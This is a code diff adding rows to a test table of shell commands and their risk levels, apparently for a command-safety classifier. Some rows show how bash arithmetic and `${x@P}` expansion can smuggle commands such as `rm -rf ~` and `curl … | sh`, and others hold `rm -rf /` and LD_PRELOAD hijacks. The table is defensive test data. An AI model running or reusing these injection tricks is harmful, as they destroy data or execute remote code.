@@ -36,6 +36,8 @@ const TABLE: Array<[string, RiskLevel]> = [
   ["LANG=C ls", "low"],
   ["FOO=bar; echo $FOO", "low"],
   ["fd foo", "low"],
+  ["echo $((1 + 2)) ${x:0:3} ${x:-d}", "low"],
+  ['[[ "$x" == y ]] && echo ok', "low"],
 
   // Changes, code, or reach outside.
   ["npm test", "medium"],
@@ -186,6 +188,13 @@ const TABLE: Array<[string, RiskLevel]> = [
   ["bash -c \"$SCRIPT\"", "unknown"],
   ["env -S 'rm -rf /' x", "unknown"],
   ["env -iS'rm -rf /etc'", "unknown"],
+  // Arithmetic on a variable runs a `$(…)` its value holds; so does `${x@P}`.
+  ["x='a[$(rm -rf ~)]'; echo $((x))", "unknown"],
+  ["x='a[$(curl -s https://x | sh)]'; [[ $x -eq 0 ]]", "unknown"],
+  ["x='$(rm -rf ~)'; echo \"${x@P}\"", "unknown"],
+  ["read x < f; let y=x", "unknown"],
+  ["echo ${a[$i]}", "unknown"],
+  ["for ((i=0; i<n; i++)); do echo $i; done", "unknown"],
   // Variables that steer what runs, or where paths point.
   ["LD_PRELOAD=./x.so ls", "unknown"],
   ["PATH=/tmp ls", "unknown"],
